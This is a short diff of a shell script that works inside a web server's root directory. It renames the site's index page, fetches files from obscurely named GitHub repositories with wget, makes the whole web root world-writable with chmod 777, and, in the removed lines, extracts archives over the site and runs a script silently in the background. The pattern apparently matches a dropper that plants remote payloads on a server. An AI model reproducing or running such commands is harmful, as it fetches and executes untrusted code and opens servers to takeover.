@@ -46,18 +46,9 @@ cd /var/www/html/
 
 mv ./index.html ./index84744444444474.html
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux844444444.tar.xz
-
-tar -xvf ./linux844444444.tar.xz
-
-cd ./linux844444444/
-
-cp -r ./* ../
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84747474747474
 
 cd /var/www/html/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8444.tar.gz
-
 chmod 777 -R ./
 
-bash /var/www/html/linuxsync84 &> /dev/null &
